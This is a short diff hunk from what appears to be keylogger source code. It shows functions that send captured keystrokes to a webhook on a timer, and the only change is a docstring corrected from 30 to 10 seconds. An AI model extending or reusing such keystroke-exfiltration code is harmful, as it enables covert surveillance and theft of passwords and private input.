@@ -35,7 +35,7 @@ def send_to_webhook(message):
 
 
 def send_keystrokes_after_delay():
-    """Send the keystrokes to the webhook after 30 seconds."""
+    """Send the keystrokes to the webhook after 10 seconds."""
     global keystrokes
     time.sleep(10)
     if keystrokes:
